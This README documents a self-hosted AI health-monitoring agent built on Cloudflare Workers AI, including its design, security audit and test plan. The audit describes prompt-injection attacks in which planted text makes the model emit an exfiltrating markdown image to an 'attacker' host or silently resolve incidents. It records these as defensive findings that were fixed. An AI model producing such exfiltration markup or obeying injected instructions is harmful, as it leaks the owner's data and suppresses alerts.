# cf_ai_home_agent

An AI health agent for the small apps and services people run at home and on hobby hosting. It checks them on its own, notices when something stops reporting, works out what is probably wrong, and tells you in plain words how to fix it, in a chat UI and as a push notification on your phone.

It knows nothing about any particular service. Everything it watches is described in a JSON config, so the same agent can watch a dashboard on a PaaS, a cron job on a home server, and a disk's SMART counters.

Built on Cloudflare Agents, Durable Objects, Workflows and Workers AI (Llama 3.3).

## What it does

- **Checks on its own.** HTTP services are probed on a schedule (hourly by default), optionally logging in first and checking status, latency and JSON fields.
- **Notices silence.** Services on your own network push a small report after each run. If a report doesn't arrive when a cron expression says it should, or a service goes quiet for too long, that's an incident. Nothing on your network has to be reachable from the internet.
- **Watches numbers.** Reports can carry metrics checked by rules: `==`, `>=`, "never increases", and "rate per hour (or per another metric) stays under X".
- **Confirms before it alerts.** A failure starts a durable Workflow that re-checks twice a minute apart, so one blip doesn't wake you.
- **Explains and offers the fix.** Each monitor can list known issues: an error pattern, the usual cause, and the fix. A match puts that cause and fix in the alert as written. For anything else, Llama 3.3 reads the monitor's runbook and recent history and writes a short diagnosis. A known issue can also carry a fix action, which the agent runs only after you approve it in chat.
- **Remembers.** Checks, reports, incidents and the conversation are stored in the agent's SQLite, so you can ask "what broke this week?" or "show the trend for smart.181".
- **Tells you when it's over.** Recoveries are posted to chat and pushed too.

## Assignment components

| Requirement | How it's met |
| --- | --- |
| LLM | Llama 3.3 70B (`@cf/meta/llama-3.3-70b-instruct-fp8-fast`) on Workers AI, for the chat (with tool calling) and incident diagnosis |
| Workflow / coordination | `HealthAgent` Durable Object runs the schedule; `TriageWorkflow` (Cloudflare Workflows) does confirm → diagnose → record → notify as durable, retried steps |
| User input via chat | React chat UI served by the Worker, streaming over a WebSocket (`AIChatAgent`) |
| Memory or state | Durable Object SQLite: monitor state, check and report history, incidents, chat history; live status pushed to the UI with agent state sync |

## Architecture

```
 browser (chat + status board) ──wss──┐
                                      ▼
 local services ──POST /api/report──► Worker ──► HealthAgent (Durable Object, SQLite)
 (curl after each run)                 │           │  every tick: due probes, missed reports  
                                       │           │  chat: Llama 3.3 + tools
 owner ──PUT /api/config──────────────┘           ▼
                                             TriageWorkflow
                                   recheck ×2 → diagnose (Llama 3.3) → incident → ntfy push
```

- `src/server.ts` is the agent: scheduling, probes, report intake, incidents, chat tools, HTTP routing and auth.
- `src/workflow.ts` is the triage Workflow.
- `src/config.ts` is the monitor schema (zod).
- `src/checks.ts` holds the HTTP probe and the rules engine.
- `src/cron.ts` is a timezone-aware cron matcher for report deadlines.
- `src/auth.ts` handles the session cookie and bearer tokens.
- `src/ai-binding.ts` fixes doubled tokens in Llama 3.3 streams.
- `src/notify.ts` sends ntfy pushes.
- `src/app.tsx` is the chat UI and status board.
- `reporter/report.sh` is a POSIX sh + curl reporter for local services.

## Configure monitors

Copy the example and edit it. `monitors.json` is gitignored, so your hostnames and runbooks never reach the repo.

```sh
cp monitors.example.json monitors.json
```

Two monitor types:

- **`http`**: the agent probes it. `login` (optional), `request`, `expect` (status, `maxLatencyMs`, JSON path checks), `intervalMinutes` (default 60).
- **`push`**: the service reports in. `expect` lists when reports should arrive (`{"cron": "15 22 * * 0-4", "graceMinutes": 10}` or `{"everyMinutes": 10}`) in the monitor's `timezone`; `rules` check the reported `metrics`.

Every monitor can have a `runbook` (free text for the LLM) and `knownIssues`:

```json
{
  "id": "upstream-unreachable",
  "match": "got 502.*ConnectError",
  "cause": "The app can't reach its upstream service.",
  "fix": "1. Check the upstream host.\n2. Check the router port forward.",
  "action": { "label": "Redeploy", "url": "${env:DEPLOY_HOOK}", "method": "POST" }
}
```

`${env:NAME}` anywhere in the config is replaced with the Worker secret `NAME`, so credentials stay in secrets.

## Hook up a local service

Add one line at the end of a job:

```sh
reporter/report.sh nightly-job ok "paused 12 devices" '{"paused":12,"failed":0}'
reporter/report.sh nightly-job fail "API returned 401"
```

The reporter reads `AGENT_URL` and `REPORT_TOKEN` from the environment or `~/.config/health-agent/env`. If the agent can't be reached it prints a warning and exits 0, so it never breaks the job it reports on.

## Run locally

Needs Node 22+ and a Cloudflare account (Workers AI runs remotely, even in dev).

```sh
npm install
npx wrangler login
cp .dev.vars.example .dev.vars        # set UI_PASSWORD, SESSION_SECRET, REPORT_TOKEN, ADMIN_TOKEN
npm run dev                            # http://localhost:5173
npm run push-config                    # uploads monitors.json to the local agent
```

Sign in with `UI_PASSWORD` and ask "Is anything broken?".

## Deploy

```sh
for s in UI_PASSWORD SESSION_SECRET REPORT_TOKEN ADMIN_TOKEN NTFY_TOPIC PUBLIC_URL; do npx wrangler secret put $s; done
npm run deploy
AGENT_URL=https://cf-ai-home-agent.<your-subdomain>.workers.dev ADMIN_TOKEN=... npm run push-config
```

For phone alerts, install the ntfy app and subscribe to your `NTFY_TOPIC`. Pick a long random topic name, because the topic is the only credential.

## Deployment status

The production deployment is **paused**. It was deployed and verified (tests 4–9, 12, 19, 25 and 26 ran against it), then paused, since the owner doesn't plan to run it day to day. Workers have no pause switch, so it was done in two reversible steps:

1. **Probes stopped.** An empty monitor list was uploaded (`{"monitors": []}` via `npm run push-config`). The agent watches nothing, so it makes no outbound checks and sends no alerts. Its 10-minute tick still wakes up and finds nothing to do.
2. **URL taken offline.** The Worker's workers.dev route was disabled through the Cloudflare API:
   ```sh
   curl -X POST "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts/cf-ai-home-agent/subdomain" \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     --data '{"enabled":false}'
   ```
   The site and API now return Cloudflare's 404. `wrangler deploy` turns the route back on by default, so run this again after any deploy you want to stay paused.

Nothing was deleted: the code, secrets, Durable Object storage (history, incidents, chat) and Workflow stay in the account, at no cost on the free plan. To resume, send the same call with `{"enabled":true}`, then upload the real `monitors.json` with `push-config`. To remove it for good, run `npx wrangler delete`.

## Security

- **Transport.** HTTPS only: plain http gets a 301 to https, and HSTS is set. The chat runs over `wss://`.
- **Headers.** `frame-ancestors 'none'`, `X-Frame-Options: DENY`, `nosniff`, `no-referrer`.
- **Chat access.** The chat UI and the agent's WebSocket require a signed, HttpOnly, Secure, SameSite=Strict session cookie, plus a same-origin `Origin` header.
- **Login.** Rate limited to 5 attempts per minute per IP.
- **Tokens.** `/api/report` and `/api/config` use separate bearer tokens, compared in constant time.
- **Read-only browsers.** Browsers can't write agent state. The agent exposes no `@callable` methods, so the WebSocket can't invoke anything but chat.
- **Approval gates.** Fix actions and resolving incidents both need your approval in chat. The agent holds no deploy credentials unless you add a fix action that needs one.
- **Nothing exposed at home.** Local services only make outbound HTTPS calls.

### Security audit

A review of the code once the first version worked. It looked at authentication, the paths untrusted data takes, and what the LLM can do. Every finding below was fixed and verified against local dev, and fixes 1 to 7 again in production.

| # | Severity | Finding | Fix | Verified by |
| --- | --- | --- | --- | --- |
| 1 | Medium | **Secrets could leak through config.** `${env:NAME}` interpolation accepted any secret, so a config could put `${env:ADMIN_TOKEN}` or `SESSION_SECRET` into a probe URL and send it to any host. | The agent's own secrets (`UI_PASSWORD`, `SESSION_SECRET`, `REPORT_TOKEN`, `ADMIN_TOKEN`, `NTFY_TOPIC`) are reserved. Uploading a config that references one fails, and interpolation refuses them at run time too. | Uploading a config with `${env:ADMIN_TOKEN}` returns 400 "secret ADMIN_TOKEN is reserved" |
| 2 | Medium | **Prompt injection could exfiltrate data through markdown.** Report messages and probe response bodies reach the model. Injected text could make it write `![](https://attacker/?q=<runbook>)`, and the chat would load that image, silently sending the data. | Model output is rendered with images disallowed and without Streamdown's `raw` HTML plugin (only `sanitize` and `harden`). Links show a confirm dialog before opening. | Headless Chrome (test #22): the model echoed a markdown image, `<img>`, `<b>` and a link; the page had 0 images, 0 HTML elements and no live link |
| 3 | Medium | **Prompt injection could silence alerts.** `resolve_incident` ran without confirmation, so injected text could get the model to close an open incident. | `resolve_incident` now needs approval, like `run_fix`. `run_fix` only exists while a fixable incident is open. | Code review; covered by the approval flow in test #21 |
| 4 | Medium | **No brute-force protection on login.** `/api/login` allowed unlimited attempts. | Workers rate limiting binding: 5 attempts per minute per client IP (`cf-connecting-ip`, set by Cloudflare). | 6 wrong passwords in a row: `401 401 401 401 401 429` |
| 5 | Low | **Cross-site WebSocket hijacking.** SameSite=Strict already stops browsers sending the cookie cross-site, but nothing checked where the WebSocket request came from. | The agent gate rejects any request whose `Origin` isn't the agent's own origin. | Valid cookie with a foreign `Origin`: 403 (dev and prod); same origin: 200 |
| 6 | Low | **Clickjacking.** The approval buttons could be framed by another site and clicked through a decoy. | `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY` on every response, plus `nosniff` and `no-referrer`. | Headers present in production |
| 7 | Low | **Report body read before the size check.** `/api/report` buffered the whole body before enforcing the 64 KB limit. | `Content-Length` is checked first; the read length is still checked after. | 70 KB report: "body too large" |
| 8 | Low | **Vulnerable dependencies.** `npm audit` flagged the MCP SDK (via `agents`) and KaTeX (via `streamdown`). | `overrides` to patched versions. | `npm audit --omit=dev`: 0 vulnerabilities |

Checked and found sound: there are no `@callable` methods, so WebSocket RPC can't reach agent internals. Browser writes to agent state are rejected. Token and password compares are constant time. The cookie is HttpOnly, Secure and SameSite=Strict, with an HMAC-SHA256 signature and an expiry. Secrets live in Worker secrets only, and `.dev.vars` and `monitors.json` are gitignored.

**Accepted risks**, documented rather than changed:

- **Sessions are stateless.** Logout clears the browser's cookie, but a stolen cookie stays valid until it expires (30 days). Rotating `SESSION_SECRET` revokes every session.
- **One report token for all reporters.** Any reporter that has it can report as any push monitor. That's acceptable when the reporters run on one trusted machine; per-monitor tokens are an easy extension.
- **ntfy.sh sees alert text.** The topic name is the only credential, and alert text, including fix steps from your runbooks, passes through ntfy.sh, which caches it for a few hours. Point `NTFY_SERVER` at a self-hosted ntfy if your runbooks are sensitive.
- **The admin token is the master key.** Whoever holds `ADMIN_TOKEN` decides what gets probed and can use the non-reserved secrets (for example a demo login) in those probes. Keep it off shared machines.
- **Probe errors reach the model.** Up to 300 characters of a failing response body are stored and shown to the model. The approval gates (findings 2 and 3) are what keep injected text in those snippets harmless.

## How it was built

Built in one session with Claude Code. Every prompt is in [PROMPTS.md](PROMPTS.md). The main steps:

1. **Scope.** The goal was one agent to keep watch over a handful of personal projects: two dashboards on Railway, a nightly router schedule job on a Mac mini, and a USB SSD on the same mini. Ground rules set early:
   - Nothing internal goes to GitHub; the repo holds generic code plus a made-up example config.
   - The agent must be generic enough to watch any local app or service.
   - Output must be friendly: give the typical cause and offer a fix.
   - It checks on its own, hourly.
   - The chat is HTTPS only.
2. **Scaffold.** Started from Cloudflare's [`agents-starter`](https://github.com/cloudflare/agents-starter) so SDK versions match a tested template. Removed the demo tools, the MCP panel and image upload (Llama 3.3 is text only).
3. **Generic monitor model** (`src/config.ts`). Monitors are data validated with zod. There are two types: `http`, where the agent probes, and `push`, where the service reports. The two kinds of failure needed different handling. A dashboard can be probed from the internet; a job on a home network can't be reached, and shouldn't be. That's why push monitors are judged on silence (cron deadlines and maximum gaps) as well as on their reported metrics.
4. **Agent** (`src/server.ts`).
   - `HealthAgent` extends `AIChatAgent`, so monitoring and chat share one Durable Object and one SQLite database.
   - It runs `scheduleEvery(TICK_SECONDS)`. Each tick runs any probe that's due and checks report deadlines. Changing the interval cancels the old schedule on startup, because `scheduleEvery` treats a new interval as a separate schedule.
   - **Tick interval: 10 minutes in this build, 1 minute in real production.** The tick started at 60 seconds and was changed to 600 (`TICK_SECONDS` in `src/server.ts`) for efficiency, since this deployment is a demo and is paused (see [Deployment status](#deployment-status)). In real production it would be every minute (`TICK_SECONDS = 60`), so a missed report is caught within about a minute of its grace period ending instead of up to 10. Hourly probes behave the same either way; each tick only runs probes that are due.
   - Report deadlines are evaluated with a small timezone-aware cron matcher (`src/cron.ts`). Each scheduled run is judged once, and runs from before a monitor existed are ignored.
   - Rules (`src/checks.ts`) compare a report with the previous one for "no increase" and "rate per hour, or per another metric".
5. **Triage** (`src/workflow.ts`). Failures start `TriageWorkflow` rather than alerting inline, which gives retries, sleeps and durability for free.
   - HTTP failures are re-probed twice, a minute apart.
   - Missed reports get a few minutes' grace.
   - Then Workers AI writes the diagnosis (JSON mode). A matching known issue supplies the cause and fix as written; if the model call fails, a deterministic fallback is used.
   - Then the incident is recorded, posted into the chat thread, and pushed via ntfy.
6. **Chat tools.** `get_status`, `list_incidents`, `get_history`, `get_metric_trend`, `run_check`, `resolve_incident`, plus `run_fix`. `run_fix` needs approval and only exists while an open incident has a configured fix.
7. **Security.** Session cookie for the UI and WebSocket, separate bearer tokens for reports and config, read-only agent state, HTTPS redirect and HSTS, constant-time compares, report size limit.
8. **UI.** Login screen, a live status board fed by agent state sync, and an incident count in the header.
9. **Dependencies.** `npm audit` flagged advisories in transitive packages: the MCP SDK via `agents`, and KaTeX via `streamdown`. Fixed with `overrides`. `npm audit --omit=dev` now reports 0.
10. **Deploy.**
    - Cloudflare login used OAuth (SSO).
    - The workers.dev subdomain was registered through the Cloudflare API.
    - Secrets were uploaded with `wrangler secret bulk` from a mode-600 file, so no secret was ever typed or printed.
    - `wrangler deploy`, then `push-config`.
11. **Security audit.** A review of the working build found 8 issues, all fixed and redeployed. See [Security audit](#security-audit).
12. **Browser test.** Headless Chrome, driven over the DevTools protocol with no extra packages, exercised the real UI. It caught two bugs the API tests missed: doubled tokens and raw HTML rendering. Both are fixed (see the table below).
13. **Paused the deployment.** This is a demo the owner doesn't plan to run day to day, so production was paused through the Cloudflare API (see [Deployment status](#deployment-status)), and the tick was changed from 1 minute to 10 for efficiency.

### Problems found in testing, and the fixes

| Found | Fix |
| --- | --- |
| Llama renamed a test monitor after a similar one's description in the incident title | The title is always the configured monitor name; the model only writes the problem phrase |
| Llama answered "nothing is broken" while `get_status` showed a failing service | `get_status` returns a digested answer (headline, broken services with cause and fix, healthy names), and the headline is also in the system prompt |
| Llama offered to "run the fix" for an incident with no automatic fix | `run_fix` is only exposed while a fixable incident is open, and the prompt says so |
| Changing the tick interval (1 minute → 10) left the old schedule running beside the new one (`scheduleEvery` dedupes on callback plus interval) | On startup, cancel any `tick` schedule whose interval isn't the current one |
| Removing a monitor left its incident open forever | Config updates quietly resolve incidents of removed monitors |
| A newly deployed push monitor alerts once its first report is due, even if the reporter isn't installed yet | Add push monitors to the config only after their reporter is installed |
| Every word in the chat appeared twice ("Nothing Nothing is is broken broken"). Llama 3.3's stream events carry each token as both `response` and `choices[0].delta.content`, and `workers-ai-provider` (3.x and 4.x) emits both | `src/ai-binding.ts` wraps the AI binding and drops `response` from an event only when it equals the delta |
| The browser test showed raw `<b>` from the model rendering as HTML; `skipHtml` had no effect because Streamdown's default `raw` rehype plugin re-enables HTML | Render with only the `sanitize` and `harden` plugins, so HTML stays inert text |

## Test plan

Run against local dev (`npm run dev`) and again against production. "Pass" means run and verified in this build.

| # | Area | Test | Expected | Result |
| --- | --- | --- | --- | --- |
| 1 | Build | `tsc --noEmit`, `oxlint src/`, `vite build` | no errors | Pass |
| 2 | Dependencies | `npm audit --omit=dev` | 0 vulnerabilities | Pass |
| 3 | Cron | `lastFireTime` for Sun–Thu 22:15, Fri/Sat 23:15, daily 05:00, `*/15`, across the Nov 1 DST change; invalid field `61` | correct local times; invalid rejected | Pass |
| 4 | Auth | `/api/report` with no token and with a bogus token | 401 | Pass (dev + prod) |
| 5 | Auth | `/api/config` with the report token (wrong scope) | 401 | Pass (dev + prod) |
| 6 | Auth | `/api/login` with a wrong password | 401 | Pass (dev + prod) |
| 7 | Auth | agent HTTP route and WebSocket upgrade without a session; then WebSocket with a session | 401 / no upgrade; then 101 | Pass (dev + prod) |
| 8 | HTTPS | `http://` request to production | 301 to `https://` | Pass |
| 9 | HTTPS | response headers in production | `Strict-Transport-Security` present | Pass |
| 10 | Config | upload an invalid monitor id | 400 with zod error, config unchanged | Pass |
| 11 | Config | report for an unknown monitor id | 404 | Pass |
| 12 | Probes | real dashboards after the first tick (login → authenticated endpoint) | `ok` with timestamps | Pass (dev + prod) |
| 13 | Negative control | monitor pointed at a missing path (404) | re-checked twice, incident opened, known issue matched, chat post | Pass |
| 14 | Rules | push report with `failed: 2` against rule `failed == 0` | incident at once (no recheck), known issue "some devices did not pause" | Pass |
| 15 | Recovery | healthy report after #14 | incident resolved, "healthy again" posted | Pass |
| 16 | Chat | "Is anything broken right now?" with one failing monitor | calls `get_status`, names the failing service, gives cause and fix | Pass, after the fix in the table above |
| 17 | Chat | "Can you fix it for me?" when the incident has no fix action | declines to run anything and gives the steps | Pass, after the fix above |
| 18 | Config | remove a monitor that has an open incident | incident closed as "monitor removed" | Pass |
| 19 | Alerts | push to the ntfy topic from production | 200, notification on phone | Pass (HTTP 200; phone delivery needs the app subscribed) |
| 20 | Missed report | push monitor with no report after its cron deadline plus grace | incident "missed report" after a 3-minute late window | Not yet run live; deadline logic covered by #3 |
| 21 | Fix action | approve `run_fix` in the UI for a known issue with an `action` | approval prompt, action called, service re-checked | Not yet run; no fix actions configured |
| 22 | UI | headless Chrome over the DevTools protocol: sign in, status board, ask "Is anything broken right now?", then ask the model to echo a markdown image, `<b>`, `<img>` and a link | login screen, live board, a clean streamed answer; 0 `img` elements, 0 HTML elements, no live link | Pass, after the two fixes below |
| 23 | Audit #1 | upload a config that references `${env:ADMIN_TOKEN}` | 400, reserved | Pass |
| 24 | Audit #4 | 6 wrong logins in a minute from one IP | 6th is 429 | Pass |
| 25 | Audit #5 | agent route with a valid cookie and a foreign `Origin` | 403 | Pass (dev + prod) |
| 26 | Audit #6 | production response headers | CSP `frame-ancestors 'none'`, `X-Frame-Options`, `nosniff`, `no-referrer` | Pass |
| 27 | Audit #7 | 70 KB report | "body too large" | Pass |

## Prompts

[PROMPTS.md](PROMPTS.md) lists the prompts used to build this with Claude Code.
